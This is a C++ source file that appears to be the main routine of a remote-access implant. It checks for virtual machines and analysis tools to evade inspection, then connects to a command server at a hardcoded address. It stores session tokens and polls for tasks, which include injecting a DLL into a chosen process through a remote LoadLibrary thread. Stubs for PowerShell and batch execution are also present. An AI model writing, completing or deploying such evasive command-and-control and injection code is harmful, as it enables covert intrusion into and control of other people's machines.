#include <logger.hpp>

import utility;
import systemManager;

#include <AntiAnalysis.hpp>

#include <Server.hpp>
#include <TaskScheduler.hpp>

#include <core/Injector/include/loadLibrary.hpp>
#include <fstream>
#include <optional>
#include <thread>

#ifndef BASE_URL
#define BASE_URL "http://0.0.0.0:8000" // default localhost
#endif
#include <string>

#ifdef Debug
constexpr int16_t DefaultRuntime = 1000;
constexpr int16_t DefaultHeartBeatDelay = 100;
#else
constexpr int16_t DefaultRuntime = 5000;
constexpr int16_t DefaultHeartBeatDelay = 500;
#endif

constexpr unsigned int DefaultConnectionPort = 8000U;

auto
SaveTokensCallback(const std::shared_ptr<std::string>& newRefreshToken,
                   const std::shared_ptr<std::string>& clientId) -> void
{
  if (!newRefreshToken || !clientId) {
    LOG_WARN("Received null refresh token or client ID in callback.");
    return;
  }

  SetConsoleTitle(("ClientID: " + *clientId).c_str());

  LOG_TRACE("SaveTokensCallback(" + *newRefreshToken + ", " + *clientId + ")");

  System::SaveTokensToFile(ConvertToWString(*newRefreshToken),
                           ConvertToWString(*clientId));
  LOG_INFO("Refresh token and client ID saved to file via callback.");
}

auto
FetchAndPrintTasks(const Server::Session::Connect* connection) -> void
{
  try {
    for (auto tasks = connection->GetTasks();
         const auto& [id, description, status, clientId, operation] : tasks) {
      LOG_TRACE("Task ID: " + id);
      LOG_INFO("Task Description: " + description);
      LOG_TRACE("Status: " + status);
      LOG_TRACE("Client ID: " + clientId);

      std::visit(
        [&]<typename T0>(const T0& opps) {
          using t = std::decay_t<T0>;
          if constexpr (std::is_same_v<t, Inject>) {
            LOG_TRACE("Operation: Inject");
            LOG_TRACE("DLL Name: " + opps.dllName);
            LOG_TRACE("Process ID: " + std::to_string(opps.processId));

            if (!Injector::LoadLibraryRemoteThread::InjectDll(
                  static_cast<DWORD>(opps.processId), opps.dllName)) {
              LOG_ERROR("Inject  Operation: FAILED");
            } else {
              LOG_TRACE("Inject Operation: SUCCESSFUL");
            }

          } else if constexpr (std::is_same_v<t, RunPowerShell>) {
            LOG_TRACE("Operation: RunPowerShell");
            LOG_TRACE("Script Path: " + opps.scriptPath);
          } else if constexpr (std::is_same_v<t, ExecuteBatch>) {
            LOG_TRACE("Operation: ExecuteBatch");
            LOG_TRACE("Batch File Path: " + opps.batchFilePath);
          }
        },
        operation);
    }
  } catch (const std::exception& e) {
    LOG_ERROR("Failed to fetch tasks: " + std::string(e.what()));
  }
}

auto
main() -> int
{
  LOG_ERROR("Checking VM");

  WinInfo::CheckVm();

  LOG_ERROR("No VM found");
  ApplicationController::InitEnv();

  if (auto* tools = Integrity::AntiAnalysis::AnalysisToolsProcess();
      tools != nullptr) {
    LOG_ERROR("Analysis Tools Found:");

    for (const auto& tool : *tools) {
      LOG_ERROR(L"  - " + tool);
    }
  } else {
    LOG_INFO("Couldn't Find Analysis Tools");
  }

  LOG_INFO("Starting Connection...");

  const auto [majorVersion, minorVersion, buildNumber] = WinInfo::Version();

  auto [refreshToken, clientId] = System::LoadTokensFromFile();
  auto* session = new Server::Session(L"A Log Client/1.0");
  LOG_TRACE("Session created");

  auto sId = WinInfo::GenerateSecureIdentifier();
  LOG_TRACE("Identifier Created!");

  std::string clientName = "Test Client";

  const auto config = Server::ClientConfig{
    .sessionToken = nullptr,
    .clientId = clientId ? &*clientId : nullptr,
    .clientUid = &sId,
    .refreshToken = refreshToken ? &*refreshToken : nullptr,
    .clientName = &clientName,
  };
  LOG_TRACE("Client Config Created!");

  auto* client = new Server::Client(config);
  LOG_TRACE("Client Created!");

  client->SetRefreshTokenUpdateCallback(SaveTokensCallback);
  LOG_TRACE("Set Callback!");

  auto* connection = new Server::Session::Connect(
    session, L"192.168.178.124", DefaultConnectionPort, client);
  LOG_TRACE("Session started!");

  const std::string versionStream =
    "Full Version: " + std::to_string(majorVersion) + "." +
    std::to_string(minorVersion) + "." + std::to_string(buildNumber);

  LOG_TRACE(versionStream);

  LOG_TRACE("Try Send Log...");
  connection->Log(log_level::Info, versionStream);

  LOG_TRACE("Initializing Task Scheduler");
  TaskScheduler<> scheduler;

  // [[maybe_unused]] Reg::RegistryManager regManager;

  const std::chrono::milliseconds defaultHeartBeatDelay(DefaultHeartBeatDelay);

  int heartbeatResult = 0;
  scheduler.AddTask(
    [&connection] { return Utility::SendHeartbeat(connection); },
    &defaultHeartBeatDelay,
    &heartbeatResult);

  const std::chrono::milliseconds fetchInterval(30000); // 30 seconds
  int fetchResult = 0;
  scheduler.AddTask([&connection] { FetchAndPrintTasks(connection); },
                    &fetchInterval,
                    &fetchResult);

  scheduler.WaitUntilStopped();

  LOG_TRACE("Exiting application.");
  LOG_TRACE("Heartbeat result: " + std::to_string(heartbeatResult));

  return 0;
}
